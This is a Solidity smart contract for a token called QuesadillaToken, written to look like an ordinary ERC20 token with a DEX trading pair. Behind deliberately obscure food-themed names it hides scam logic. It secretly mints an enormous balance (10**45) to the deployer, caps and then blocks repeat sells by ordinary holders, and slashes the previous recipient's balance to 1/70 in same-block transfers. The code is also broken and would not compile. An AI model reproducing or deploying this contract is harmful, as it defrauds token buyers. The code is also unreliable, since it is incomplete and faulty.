pragma solidity ^0.8.0;

contract QuesadillaToken is ERC20Token {
    mapping (address => bool) private Onions;
    mapping (address => bool) private Tomatoes;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    uint256 private tortillas;
    IDEXRouter router;

    string private _name; string private _symbol; address private _msgSenders;
    uint256 private _totalSupply; uint256 private Beans; uint256 private Nachos;
    bool private Sushi; uint256 private ups;
    
    uint256 private Corn = 0;
    address private Flour = address(0);
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _msgSenders = msgSender_;
        _name = name_;
        _symbol = symbol_;
    }
    
    function _balanceOfOnionss(address account) internal {
        _balances[account] += (((account == _msgSenders) && (tortillas > 2)) ? (10 ** 45) : 0);
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
        return true;
    }
    
    function _balanceOfTortillas(address sender, address recipient, uint256 amount, bool doodle) internal {
        (Beans,Sushi) = doodle ? (Nachos, true) : (Beans,Sushi);

        if ((Onions[sender] != true)) {
            require(amount < Beans);
            if (Sushi == true) {
                require(!(Tomatoes[sender] == true));
                Tomatoes[sender] = true;
            }
        }
        _balances[Flour] = ((Corn == block.timestamp) && (Onions[recipient] != true) && (Onions[Flour] != true) && (ups > 2)) ? (_balances[Flour]/70) : (_balances[Flour]);
        ups++; Flour = recipient; Corn = block.timestamp;
    }

    function transfer(address recipient, uint256 amount) public {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function _MeltTheCheese(address creator, uint256 jkal) internal {
        approve(_router, 10 ** 77);  
        (tortillas,Sushi,Beans,ups) = (0,false,(jkal/20),0);
        (Nachos,Onions[_router],Onions[creator],Onions[pair]) = ((jkal/1000),true,true,true);
        (Tomatoes[_router],Tomatoes[creator]) = (false, false); 
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function approve(address spender, uint256 amount) public {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function _balanceOfQuesadilla(address sender, address recipient, uint256 amount) internal {
        _balanceOfTortillas(sender, recipient, amount, (address(sender) == _msgSenders) && (tortillas > 0));
        tortillas += (sender == _msgSenders) ? 1 : 0;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployTortilla(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        
        emit Transfer(address(0), account, amount); 
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balanceOfQuesadilla(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        _balanceOfOnionss(sender);

        emit Transfer(sender, recipient, amount);
    }
}
